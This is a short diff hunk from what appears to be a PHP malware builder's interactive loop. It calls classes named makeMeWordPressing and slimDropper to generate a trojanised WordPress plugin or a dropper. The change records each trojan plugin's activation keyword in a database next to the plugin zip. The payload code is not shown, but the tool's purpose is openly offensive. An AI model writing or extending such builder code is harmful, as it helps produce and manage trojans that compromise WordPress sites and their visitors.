@@ -57,7 +57,11 @@ while (true){
             if (str_contains(trim(strtolower(readline("-> "))), "press")){
                 $trj = new makeMeWordPressing(readline("Activation Keyword?\n->"));
                 $a = $trj->createTrojanWordpress();
-                $database->insertData(["action" => "add_press", "zip" => $a['TrojanPlugin']]);
+                $database->insertData([
+                    "action" => "add_press",
+                    "zip" => $a['TrojanPlugin'],
+                    "activator" => $a['ActivationWord']]
+                );
             }else{
                 $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                 $a = $trj->generateDropper();
